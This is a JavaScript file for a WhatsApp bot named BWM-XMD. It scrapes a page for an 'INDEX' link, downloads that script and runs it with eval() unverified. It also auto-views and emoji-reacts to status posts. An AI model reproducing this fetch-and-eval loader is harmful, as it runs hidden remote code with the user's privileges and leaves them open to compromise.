//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config");

// Fetch dynamic INDEX script
async function fetchINDEXUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("INDEX")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) throw new Error('heart not found 😭');

    console.log('The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

// Auto Status View & Auto React
function setupAutoViewAndReact() {
  try {
    conn.ev.on('messages.upsert', async (msg) => {
      try {
        const m = msg.messages[0];
        if (!m || m.key.fromMe || !m.key.remoteJid.includes('status@broadcast')) return;

        // Optional delay
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Auto view status
        await conn.readMessages([m.key]);

        // Random emoji for reaction
        const emojis = ['❤️', '🔥', '😍', '😎', '✨'];
        const chosenEmoji = emojis[Math.floor(Math.random() * emojis.length)];

        // Auto react
        await conn.sendMessage(m.key.remoteJid, {
          react: {
            text: chosenEmoji,
            key: m.key
          }
        });

        console.log(`Viewed & reacted with ${chosenEmoji} to ${m.key.remoteJid}`);
      } catch (e) {
        console.error('Auto Status View/React Error:', e);
      }
    });
  } catch (err) {
    console.error('setupAutoViewAndReact error:', err);
  }
}

// Start the bot
fetchINDEXUrl();

// Delay setup until conn is defined
let checkConn = setInterval(() => {
  if (typeof conn !== 'undefined') {
    clearInterval(checkConn);
    setupAutoViewAndReact();
    console.log("Auto View & React feature initialized.");

    // Do NOT send any startup announcement message
  }
}, 1000);
